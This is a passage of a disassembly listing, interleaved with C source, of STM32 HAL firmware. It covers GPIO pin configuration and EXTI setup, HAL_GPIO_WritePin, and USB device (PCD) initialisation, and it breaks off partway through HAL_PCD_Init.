        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 8001c96:	697b      	ldr	r3, [r7, #20]
 8001c98:	08da      	lsrs	r2, r3, #3
 8001c9a:	687b      	ldr	r3, [r7, #4]
 8001c9c:	3208      	adds	r2, #8
 8001c9e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8001ca2:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 8001ca4:	697b      	ldr	r3, [r7, #20]
 8001ca6:	f003 0307 	and.w	r3, r3, #7
 8001caa:	009b      	lsls	r3, r3, #2
 8001cac:	220f      	movs	r2, #15
 8001cae:	fa02 f303 	lsl.w	r3, r2, r3
 8001cb2:	43db      	mvns	r3, r3
 8001cb4:	693a      	ldr	r2, [r7, #16]
 8001cb6:	4013      	ands	r3, r2
 8001cb8:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 8001cba:	683b      	ldr	r3, [r7, #0]
 8001cbc:	691a      	ldr	r2, [r3, #16]
 8001cbe:	697b      	ldr	r3, [r7, #20]
 8001cc0:	f003 0307 	and.w	r3, r3, #7
 8001cc4:	009b      	lsls	r3, r3, #2
 8001cc6:	fa02 f303 	lsl.w	r3, r2, r3
 8001cca:	693a      	ldr	r2, [r7, #16]
 8001ccc:	4313      	orrs	r3, r2
 8001cce:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001cd0:	697b      	ldr	r3, [r7, #20]
 8001cd2:	08da      	lsrs	r2, r3, #3
 8001cd4:	687b      	ldr	r3, [r7, #4]
 8001cd6:	3208      	adds	r2, #8
 8001cd8:	6939      	ldr	r1, [r7, #16]
 8001cda:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001cde:	687b      	ldr	r3, [r7, #4]
 8001ce0:	681b      	ldr	r3, [r3, #0]
 8001ce2:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001ce4:	697b      	ldr	r3, [r7, #20]
 8001ce6:	005b      	lsls	r3, r3, #1
 8001ce8:	2203      	movs	r2, #3
 8001cea:	fa02 f303 	lsl.w	r3, r2, r3
 8001cee:	43db      	mvns	r3, r3
 8001cf0:	693a      	ldr	r2, [r7, #16]
 8001cf2:	4013      	ands	r3, r2
 8001cf4:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001cf6:	683b      	ldr	r3, [r7, #0]
 8001cf8:	685b      	ldr	r3, [r3, #4]
 8001cfa:	f003 0203 	and.w	r2, r3, #3
 8001cfe:	697b      	ldr	r3, [r7, #20]
 8001d00:	005b      	lsls	r3, r3, #1
 8001d02:	fa02 f303 	lsl.w	r3, r2, r3
 8001d06:	693a      	ldr	r2, [r7, #16]
 8001d08:	4313      	orrs	r3, r2
 8001d0a:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001d0c:	687b      	ldr	r3, [r7, #4]
 8001d0e:	693a      	ldr	r2, [r7, #16]
 8001d10:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001d12:	683b      	ldr	r3, [r7, #0]
 8001d14:	685b      	ldr	r3, [r3, #4]
 8001d16:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001d1a:	2b00      	cmp	r3, #0
 8001d1c:	f000 8094 	beq.w	8001e48 <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001d20:	4b52      	ldr	r3, [pc, #328]	; (8001e6c <HAL_GPIO_Init+0x2c0>)
 8001d22:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001d24:	4a51      	ldr	r2, [pc, #324]	; (8001e6c <HAL_GPIO_Init+0x2c0>)
 8001d26:	f043 0301 	orr.w	r3, r3, #1
 8001d2a:	6613      	str	r3, [r2, #96]	; 0x60
 8001d2c:	4b4f      	ldr	r3, [pc, #316]	; (8001e6c <HAL_GPIO_Init+0x2c0>)
 8001d2e:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001d30:	f003 0301 	and.w	r3, r3, #1
 8001d34:	60bb      	str	r3, [r7, #8]
 8001d36:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001d38:	4a4d      	ldr	r2, [pc, #308]	; (8001e70 <HAL_GPIO_Init+0x2c4>)
 8001d3a:	697b      	ldr	r3, [r7, #20]
 8001d3c:	089b      	lsrs	r3, r3, #2
 8001d3e:	3302      	adds	r3, #2
 8001d40:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001d44:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001d46:	697b      	ldr	r3, [r7, #20]
 8001d48:	f003 0303 	and.w	r3, r3, #3
 8001d4c:	009b      	lsls	r3, r3, #2
 8001d4e:	220f      	movs	r2, #15
 8001d50:	fa02 f303 	lsl.w	r3, r2, r3
 8001d54:	43db      	mvns	r3, r3
 8001d56:	693a      	ldr	r2, [r7, #16]
 8001d58:	4013      	ands	r3, r2
 8001d5a:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001d5c:	687b      	ldr	r3, [r7, #4]
 8001d5e:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001d62:	d00d      	beq.n	8001d80 <HAL_GPIO_Init+0x1d4>
 8001d64:	687b      	ldr	r3, [r7, #4]
 8001d66:	4a43      	ldr	r2, [pc, #268]	; (8001e74 <HAL_GPIO_Init+0x2c8>)
 8001d68:	4293      	cmp	r3, r2
 8001d6a:	d007      	beq.n	8001d7c <HAL_GPIO_Init+0x1d0>
 8001d6c:	687b      	ldr	r3, [r7, #4]
 8001d6e:	4a42      	ldr	r2, [pc, #264]	; (8001e78 <HAL_GPIO_Init+0x2cc>)
 8001d70:	4293      	cmp	r3, r2
 8001d72:	d101      	bne.n	8001d78 <HAL_GPIO_Init+0x1cc>
 8001d74:	2302      	movs	r3, #2
 8001d76:	e004      	b.n	8001d82 <HAL_GPIO_Init+0x1d6>
 8001d78:	2307      	movs	r3, #7
 8001d7a:	e002      	b.n	8001d82 <HAL_GPIO_Init+0x1d6>
 8001d7c:	2301      	movs	r3, #1
 8001d7e:	e000      	b.n	8001d82 <HAL_GPIO_Init+0x1d6>
 8001d80:	2300      	movs	r3, #0
 8001d82:	697a      	ldr	r2, [r7, #20]
 8001d84:	f002 0203 	and.w	r2, r2, #3
 8001d88:	0092      	lsls	r2, r2, #2
 8001d8a:	4093      	lsls	r3, r2
 8001d8c:	693a      	ldr	r2, [r7, #16]
 8001d8e:	4313      	orrs	r3, r2
 8001d90:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001d92:	4937      	ldr	r1, [pc, #220]	; (8001e70 <HAL_GPIO_Init+0x2c4>)
 8001d94:	697b      	ldr	r3, [r7, #20]
 8001d96:	089b      	lsrs	r3, r3, #2
 8001d98:	3302      	adds	r3, #2
 8001d9a:	693a      	ldr	r2, [r7, #16]
 8001d9c:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001da0:	4b36      	ldr	r3, [pc, #216]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001da2:	689b      	ldr	r3, [r3, #8]
 8001da4:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001da6:	68fb      	ldr	r3, [r7, #12]
 8001da8:	43db      	mvns	r3, r3
 8001daa:	693a      	ldr	r2, [r7, #16]
 8001dac:	4013      	ands	r3, r2
 8001dae:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001db0:	683b      	ldr	r3, [r7, #0]
 8001db2:	685b      	ldr	r3, [r3, #4]
 8001db4:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001db8:	2b00      	cmp	r3, #0
 8001dba:	d003      	beq.n	8001dc4 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001dbc:	693a      	ldr	r2, [r7, #16]
 8001dbe:	68fb      	ldr	r3, [r7, #12]
 8001dc0:	4313      	orrs	r3, r2
 8001dc2:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001dc4:	4a2d      	ldr	r2, [pc, #180]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001dc6:	693b      	ldr	r3, [r7, #16]
 8001dc8:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001dca:	4b2c      	ldr	r3, [pc, #176]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001dcc:	68db      	ldr	r3, [r3, #12]
 8001dce:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001dd0:	68fb      	ldr	r3, [r7, #12]
 8001dd2:	43db      	mvns	r3, r3
 8001dd4:	693a      	ldr	r2, [r7, #16]
 8001dd6:	4013      	ands	r3, r2
 8001dd8:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001dda:	683b      	ldr	r3, [r7, #0]
 8001ddc:	685b      	ldr	r3, [r3, #4]
 8001dde:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001de2:	2b00      	cmp	r3, #0
 8001de4:	d003      	beq.n	8001dee <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001de6:	693a      	ldr	r2, [r7, #16]
 8001de8:	68fb      	ldr	r3, [r7, #12]
 8001dea:	4313      	orrs	r3, r2
 8001dec:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001dee:	4a23      	ldr	r2, [pc, #140]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001df0:	693b      	ldr	r3, [r7, #16]
 8001df2:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001df4:	4b21      	ldr	r3, [pc, #132]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001df6:	685b      	ldr	r3, [r3, #4]
 8001df8:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001dfa:	68fb      	ldr	r3, [r7, #12]
 8001dfc:	43db      	mvns	r3, r3
 8001dfe:	693a      	ldr	r2, [r7, #16]
 8001e00:	4013      	ands	r3, r2
 8001e02:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001e04:	683b      	ldr	r3, [r7, #0]
 8001e06:	685b      	ldr	r3, [r3, #4]
 8001e08:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001e0c:	2b00      	cmp	r3, #0
 8001e0e:	d003      	beq.n	8001e18 <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001e10:	693a      	ldr	r2, [r7, #16]
 8001e12:	68fb      	ldr	r3, [r7, #12]
 8001e14:	4313      	orrs	r3, r2
 8001e16:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001e18:	4a18      	ldr	r2, [pc, #96]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001e1a:	693b      	ldr	r3, [r7, #16]
 8001e1c:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001e1e:	4b17      	ldr	r3, [pc, #92]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001e20:	681b      	ldr	r3, [r3, #0]
 8001e22:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001e24:	68fb      	ldr	r3, [r7, #12]
 8001e26:	43db      	mvns	r3, r3
 8001e28:	693a      	ldr	r2, [r7, #16]
 8001e2a:	4013      	ands	r3, r2
 8001e2c:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001e2e:	683b      	ldr	r3, [r7, #0]
 8001e30:	685b      	ldr	r3, [r3, #4]
 8001e32:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001e36:	2b00      	cmp	r3, #0
 8001e38:	d003      	beq.n	8001e42 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001e3a:	693a      	ldr	r2, [r7, #16]
 8001e3c:	68fb      	ldr	r3, [r7, #12]
 8001e3e:	4313      	orrs	r3, r2
 8001e40:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001e42:	4a0e      	ldr	r2, [pc, #56]	; (8001e7c <HAL_GPIO_Init+0x2d0>)
 8001e44:	693b      	ldr	r3, [r7, #16]
 8001e46:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001e48:	697b      	ldr	r3, [r7, #20]
 8001e4a:	3301      	adds	r3, #1
 8001e4c:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001e4e:	683b      	ldr	r3, [r7, #0]
 8001e50:	681a      	ldr	r2, [r3, #0]
 8001e52:	697b      	ldr	r3, [r7, #20]
 8001e54:	fa22 f303 	lsr.w	r3, r2, r3
 8001e58:	2b00      	cmp	r3, #0
 8001e5a:	f47f aeaf 	bne.w	8001bbc <HAL_GPIO_Init+0x10>
  }
}
 8001e5e:	bf00      	nop
 8001e60:	bf00      	nop
 8001e62:	371c      	adds	r7, #28
 8001e64:	46bd      	mov	sp, r7
 8001e66:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001e6a:	4770      	bx	lr
 8001e6c:	40021000 	.word	0x40021000
 8001e70:	40010000 	.word	0x40010000
 8001e74:	48000400 	.word	0x48000400
 8001e78:	48000800 	.word	0x48000800
 8001e7c:	40010400 	.word	0x40010400

08001e80 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001e80:	b480      	push	{r7}
 8001e82:	b083      	sub	sp, #12
 8001e84:	af00      	add	r7, sp, #0
 8001e86:	6078      	str	r0, [r7, #4]
 8001e88:	460b      	mov	r3, r1
 8001e8a:	807b      	strh	r3, [r7, #2]
 8001e8c:	4613      	mov	r3, r2
 8001e8e:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001e90:	787b      	ldrb	r3, [r7, #1]
 8001e92:	2b00      	cmp	r3, #0
 8001e94:	d003      	beq.n	8001e9e <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001e96:	887a      	ldrh	r2, [r7, #2]
 8001e98:	687b      	ldr	r3, [r7, #4]
 8001e9a:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001e9c:	e002      	b.n	8001ea4 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001e9e:	887a      	ldrh	r2, [r7, #2]
 8001ea0:	687b      	ldr	r3, [r7, #4]
 8001ea2:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001ea4:	bf00      	nop
 8001ea6:	370c      	adds	r7, #12
 8001ea8:	46bd      	mov	sp, r7
 8001eaa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001eae:	4770      	bx	lr

08001eb0 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001eb0:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001eb2:	b08b      	sub	sp, #44	; 0x2c
 8001eb4:	af06      	add	r7, sp, #24
 8001eb6:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001eb8:	687b      	ldr	r3, [r7, #4]
 8001eba:	2b00      	cmp	r3, #0
 8001ebc:	d101      	bne.n	8001ec2 <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001ebe:	2301      	movs	r3, #1
 8001ec0:	e0f8      	b.n	80020b4 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001ec2:	687b      	ldr	r3, [r7, #4]
 8001ec4:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001ec8:	b2db      	uxtb	r3, r3
 8001eca:	2b00      	cmp	r3, #0
 8001ecc:	d106      	bne.n	8001edc <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001ece:	687b      	ldr	r3, [r7, #4]
 8001ed0:	2200      	movs	r2, #0
 8001ed2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001ed6:	6878      	ldr	r0, [r7, #4]
 8001ed8:	f00a fde4 	bl	800caa4 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001edc:	687b      	ldr	r3, [r7, #4]
 8001ede:	2203      	movs	r2, #3
 8001ee0:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001ee4:	687b      	ldr	r3, [r7, #4]
 8001ee6:	681b      	ldr	r3, [r3, #0]
 8001ee8:	4618      	mov	r0, r3
 8001eea:	f004 f8d4 	bl	8006096 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001eee:	687b      	ldr	r3, [r7, #4]
 8001ef0:	681b      	ldr	r3, [r3, #0]
 8001ef2:	603b      	str	r3, [r7, #0]
 8001ef4:	687e      	ldr	r6, [r7, #4]
 8001ef6:	466d      	mov	r5, sp
 8001ef8:	f106 0410 	add.w	r4, r6, #16
 8001efc:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001efe:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001f00:	6823      	ldr	r3, [r4, #0]
 8001f02:	602b      	str	r3, [r5, #0]
 8001f04:	1d33      	adds	r3, r6, #4
 8001f06:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001f08:	6838      	ldr	r0, [r7, #0]
 8001f0a:	f004 f89c 	bl	8006046 <USB_CoreInit>
 8001f0e:	4603      	mov	r3, r0
 8001f10:	2b00      	cmp	r3, #0
 8001f12:	d005      	beq.n	8001f20 <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001f14:	687b      	ldr	r3, [r7, #4]
 8001f16:	2202      	movs	r2, #2
 8001f18:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001f1c:	2301      	movs	r3, #1
 8001f1e:	e0c9      	b.n	80020b4 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001f20:	687b      	ldr	r3, [r7, #4]
 8001f22:	681b      	ldr	r3, [r3, #0]
 8001f24:	2100      	movs	r1, #0
 8001f26:	4618      	mov	r0, r3
 8001f28:	f004 f8d0 	bl	80060cc <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001f2c:	2300      	movs	r3, #0
 8001f2e:	73fb      	strb	r3, [r7, #15]
 8001f30:	e040      	b.n	8001fb4 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001f32:	7bfb      	ldrb	r3, [r7, #15]
 8001f34:	6879      	ldr	r1, [r7, #4]
 8001f36:	1c5a      	adds	r2, r3, #1
 8001f38:	4613      	mov	r3, r2
 8001f3a:	009b      	lsls	r3, r3, #2
 8001f3c:	4413      	add	r3, r2
 8001f3e:	00db      	lsls	r3, r3, #3
 8001f40:	440b      	add	r3, r1
 8001f42:	3301      	adds	r3, #1
 8001f44:	2201      	movs	r2, #1
 8001f46:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001f48:	7bfb      	ldrb	r3, [r7, #15]
 8001f4a:	6879      	ldr	r1, [r7, #4]
 8001f4c:	1c5a      	adds	r2, r3, #1
 8001f4e:	4613      	mov	r3, r2
 8001f50:	009b      	lsls	r3, r3, #2
 8001f52:	4413      	add	r3, r2
 8001f54:	00db      	lsls	r3, r3, #3
 8001f56:	440b      	add	r3, r1
 8001f58:	7bfa      	ldrb	r2, [r7, #15]
 8001f5a:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001f5c:	7bfb      	ldrb	r3, [r7, #15]
 8001f5e:	6879      	ldr	r1, [r7, #4]
 8001f60:	1c5a      	adds	r2, r3, #1
 8001f62:	4613      	mov	r3, r2
 8001f64:	009b      	lsls	r3, r3, #2
 8001f66:	4413      	add	r3, r2
 8001f68:	00db      	lsls	r3, r3, #3
 8001f6a:	440b      	add	r3, r1
 8001f6c:	3303      	adds	r3, #3
 8001f6e:	2200      	movs	r2, #0
 8001f70:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001f72:	7bfa      	ldrb	r2, [r7, #15]
 8001f74:	6879      	ldr	r1, [r7, #4]
 8001f76:	4613      	mov	r3, r2
 8001f78:	009b      	lsls	r3, r3, #2
 8001f7a:	4413      	add	r3, r2
 8001f7c:	00db      	lsls	r3, r3, #3
 8001f7e:	440b      	add	r3, r1
 8001f80:	3338      	adds	r3, #56	; 0x38
 8001f82:	2200      	movs	r2, #0
 8001f84:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001f86:	7bfa      	ldrb	r2, [r7, #15]
 8001f88:	6879      	ldr	r1, [r7, #4]
 8001f8a:	4613      	mov	r3, r2
 8001f8c:	009b      	lsls	r3, r3, #2
 8001f8e:	4413      	add	r3, r2
 8001f90:	00db      	lsls	r3, r3, #3
 8001f92:	440b      	add	r3, r1
 8001f94:	333c      	adds	r3, #60	; 0x3c
 8001f96:	2200      	movs	r2, #0
 8001f98:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001f9a:	7bfa      	ldrb	r2, [r7, #15]
 8001f9c:	6879      	ldr	r1, [r7, #4]
 8001f9e:	4613      	mov	r3, r2
 8001fa0:	009b      	lsls	r3, r3, #2
 8001fa2:	4413      	add	r3, r2
 8001fa4:	00db      	lsls	r3, r3, #3
 8001fa6:	440b      	add	r3, r1
 8001fa8:	3340      	adds	r3, #64	; 0x40
 8001faa:	2200      	movs	r2, #0
 8001fac:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001fae:	7bfb      	ldrb	r3, [r7, #15]
 8001fb0:	3301      	adds	r3, #1
 8001fb2:	73fb      	strb	r3, [r7, #15]
 8001fb4:	7bfa      	ldrb	r2, [r7, #15]
 8001fb6:	687b      	ldr	r3, [r7, #4]
 8001fb8:	685b      	ldr	r3, [r3, #4]
 8001fba:	429a      	cmp	r2, r3
 8001fbc:	d3b9      	bcc.n	8001f32 <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001fbe:	2300      	movs	r3, #0
 8001fc0:	73fb      	strb	r3, [r7, #15]
 8001fc2:	e044      	b.n	800204e <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001fc4:	7bfa      	ldrb	r2, [r7, #15]
 8001fc6:	6879      	ldr	r1, [r7, #4]
 8001fc8:	4613      	mov	r3, r2
 8001fca:	009b      	lsls	r3, r3, #2
 8001fcc:	4413      	add	r3, r2
 8001fce:	00db      	lsls	r3, r3, #3
 8001fd0:	440b      	add	r3, r1
 8001fd2:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001fd6:	2200      	movs	r2, #0
 8001fd8:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001fda:	7bfa      	ldrb	r2, [r7, #15]
 8001fdc:	6879      	ldr	r1, [r7, #4]
 8001fde:	4613      	mov	r3, r2
 8001fe0:	009b      	lsls	r3, r3, #2
 8001fe2:	4413      	add	r3, r2
 8001fe4:	00db      	lsls	r3, r3, #3
 8001fe6:	440b      	add	r3, r1
 8001fe8:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001fec:	7bfa      	ldrb	r2, [r7, #15]
 8001fee:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001ff0:	7bfa      	ldrb	r2, [r7, #15]
 8001ff2:	6879      	ldr	r1, [r7, #4]
 8001ff4:	4613      	mov	r3, r2
 8001ff6:	009b      	lsls	r3, r3, #2
 8001ff8:	4413      	add	r3, r2
 8001ffa:	00db      	lsls	r3, r3, #3
 8001ffc:	440b      	add	r3, r1
 8001ffe:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8002002:	2200      	movs	r2, #0
 8002004:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8002006:	7bfa      	ldrb	r2, [r7, #15]
 8002008:	6879      	ldr	r1, [r7, #4]
 800200a:	4613      	mov	r3, r2
 800200c:	009b      	lsls	r3, r3, #2
 800200e:	4413      	add	r3, r2
 8002010:	00db      	lsls	r3, r3, #3
 8002012:	440b      	add	r3, r1
 8002014:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8002018:	2200      	movs	r2, #0
 800201a:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 800201c:	7bfa      	ldrb	r2, [r7, #15]
 800201e:	6879      	ldr	r1, [r7, #4]
 8002020:	4613      	mov	r3, r2
 8002022:	009b      	lsls	r3, r3, #2
 8002024:	4413      	add	r3, r2
 8002026:	00db      	lsls	r3, r3, #3
 8002028:	440b      	add	r3, r1
 800202a:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800202e:	2200      	movs	r2, #0
 8002030:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8002032:	7bfa      	ldrb	r2, [r7, #15]
 8002034:	6879      	ldr	r1, [r7, #4]
 8002036:	4613      	mov	r3, r2
 8002038:	009b      	lsls	r3, r3, #2
 800203a:	4413      	add	r3, r2
 800203c:	00db      	lsls	r3, r3, #3
 800203e:	440b      	add	r3, r1
 8002040:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8002044:	2200      	movs	r2, #0
 8002046:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8002048:	7bfb      	ldrb	r3, [r7, #15]
 800204a:	3301      	adds	r3, #1
 800204c:	73fb      	strb	r3, [r7, #15]
 800204e:	7bfa      	ldrb	r2, [r7, #15]
 8002050:	687b      	ldr	r3, [r7, #4]
 8002052:	685b      	ldr	r3, [r3, #4]
 8002054:	429a      	cmp	r2, r3
 8002056:	d3b5      	bcc.n	8001fc4 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8002058:	687b      	ldr	r3, [r7, #4]
 800205a:	681b      	ldr	r3, [r3, #0]
 800205c:	603b      	str	r3, [r7, #0]
 800205e:	687e      	ldr	r6, [r7, #4]
 8002060:	466d      	mov	r5, sp
 8002062:	f106 0410 	add.w	r4, r6, #16
 8002066:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8002068:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 800206a:	6823      	ldr	r3, [r4, #0]
 800206c:	602b      	str	r3, [r5, #0]
 800206e:	1d33      	adds	r3, r6, #4
 8002070:	cb0e      	ldmia	r3, {r1, r2, r3}
 8002072:	6838      	ldr	r0, [r7, #0]
 8002074:	f004 f837 	bl	80060e6 <USB_DevInit>
 8002078:	4603      	mov	r3, r0
 800207a:	2b00      	cmp	r3, #0
 800207c:	d005      	beq.n	800208a <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 800207e:	687b      	ldr	r3, [r7, #4]
 8002080:	2202      	movs	r2, #2
 8002082:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8002086:	2301      	movs	r3, #1
